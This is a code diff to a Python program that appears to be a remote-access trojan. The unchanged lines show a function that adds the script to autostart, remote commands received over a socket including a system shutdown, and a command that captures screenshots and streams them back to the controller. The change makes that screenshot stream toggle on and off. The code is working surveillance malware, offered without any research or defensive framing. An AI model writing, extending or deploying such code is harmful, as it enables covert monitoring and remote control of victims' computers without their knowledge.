@@ -3,11 +3,11 @@ import pickle
 import os
 import shutil
 import pyautogui
-
 from PIL import Image
 import io
 
 HEADERSIZE = 10
+screenshot_active = False
 
 def add_to_autostart():
     script_path = os.path.abspath(__file__)
@@ -65,7 +65,8 @@ while True:
                 elif os.name == 'posix':  # Linux
                     os.system("shutdown now")
             elif command == "223":
-                while True:
+                screenshot_active = not screenshot_active
+                while screenshot_active:
                     screenshot = pyautogui.screenshot()
                     img_byte_arr = io.BytesIO()
                     screenshot.save(img_byte_arr, format='PNG')
@@ -73,5 +74,7 @@ while True:
                     img_msg = pickle.dumps(img_byte_arr)
                     img_msg = bytes(f"{len(img_msg):<{HEADERSIZE}}", 'utf-8') + img_msg
                     s.send(img_msg)
+                    if s.recv(16) == b'223':
+                        screenshot_active = False
             new_msg = True
             full_msg = b""
